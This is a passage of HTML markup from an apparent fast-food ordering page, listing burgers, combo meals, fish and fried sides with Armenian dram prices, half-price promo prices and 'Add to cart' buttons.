                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/1200x800_Burger_Deliveroo_Chicken-Burger.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Burger</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">610֏</div>
                                                                    <div class="promo-price">305֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Chicken_Fries_-1200x800_DE-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Fries</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">780֏</div>
                                                                    <div class="promo-price">390֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Nuggets_5pc_1200x800.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chicken Nuggets</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">550֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="_2K7f4-40">
                                        <div class="jy9vn-40" id="part_7"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">համակցված հավաքածուներ</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo2.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Crazy Bacon (1 meat)</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1600֏</div>
                                                                    <div class="promo-price">800֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo1.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Crazy Bacon(2 meats and OREO)</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">2200֏</div>
                                                                    <div class="promo-price">1100֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <!--<li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/666.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">10 Shrimps</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">20.00</div>
                                                                    <div class="promo-price">10.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>-->
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo3.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Duo Bacon Cheddar</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1800֏</div>
                                                                    <div class="promo-price">900֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display:flex; align-items:center;height:128px;"><img src="bkimg/kombo4.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Espaniol Whopper Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">2400֏</div>
                                                                    <div class="promo-price">1200֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo5.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Big King XXL Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180" style="font-size: 14px;">2400֏</div>
                                                                    <div class="promo-price" style="font-size: 19px;">1200֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo6.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Double Steakhouse Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180" style="font-size: 14px;">2100֏</div>
                                                                    <div class="promo-price" style="font-size: 19px;">1050֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo7.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Steakhouse Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180" style="font-size: 14px;">1700֏</div>
                                                                    <div class="promo-price" style="font-size: 19px;">850֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo8.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Big King Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180" style="font-size: 14px;">1900֏</div>
                                                                    <div class="promo-price" style="font-size: 19px;">950֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo9.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Double Cheeseburger Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180" style="font-size: 14px;">1300֏</div>
                                                                    <div class="promo-price" style="font-size: 19px;">650֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/kombo10.avif"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Cheeseburger Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180" style="font-size: 14px;">900֏</div>
                                                                    <div class="promo-price" style="font-size: 19px;">450֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="_2K7f4-40">
                                        <div id="part_3" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">Ձկան կոտլետ</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_FISH_Burger_72dpi.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">King Fish</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">1050֏</div>
                                                                    <div class="promo-price">525֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <!--<li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/s1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Shrimp sandwich</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">10.00</div>
                                                                    <div class="promo-price">5.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/s1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Spicy Shrimp Sandwich</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">10.00</div>
                                                                    <div class="promo-price">5.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/20120723_jumbo-shrimp-meal-thumb.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Jumbo Shrimp Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">12.00</div>
                                                                    <div class="promo-price">6.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/20120723_value-shrimp-meal-thumb.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Value Shrimp Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">8.00</div>
                                                                    <div class="promo-price">4.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/20120723_Fish-Fillet-Nuggets-meal-thumb.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Fish Fillet Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">8.00</div>
                                                                    <div class="promo-price">4.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/20120723_Fish-fillet-sandwich-thumb.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Mini Shrimp Sandwich</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">7.00</div>
                                                                    <div class="promo-price">3.50</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/20120723_Fish-Fillet-Nuggets-meal-thumb.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Spicy Fish Fillet Meal</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">10.00</div>
                                                                    <div class="promo-price">5.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/111.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Striped chickens</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">4.00</div>
                                                                    <div class="promo-price">2.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/medalyons.jpg"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Cheese medallions</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">4.00</div>
                                                                    <div class="promo-price">2.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>-->
                                        </ul>
                                    </div>
                                    <div class="_2K7f4-40">
                                        <div id="part_4" class="jy9vn-40"></div>
                                        <h2 class="kostamaster073 kidYN-40 kostamaster075">Նախուտեստներ</h2>
                                        <ul class="_2ActO-40">
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Crispy_Onions_Loaded_Fries_-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Crispy Onion Loaded Fries</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">550֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/Chili-Cheese-Loaded-Fries_-1200x800_DE.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Chilli Cheese Loaded Fries</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">550֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;"><img src="bkimg/Web_App_1200x800_Sides_Bacon_Cheese_Fries_Web.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Bacon Cheese Loaded Fries</h3>
                                                                </div>
                                                            </div>
                                                        </div>
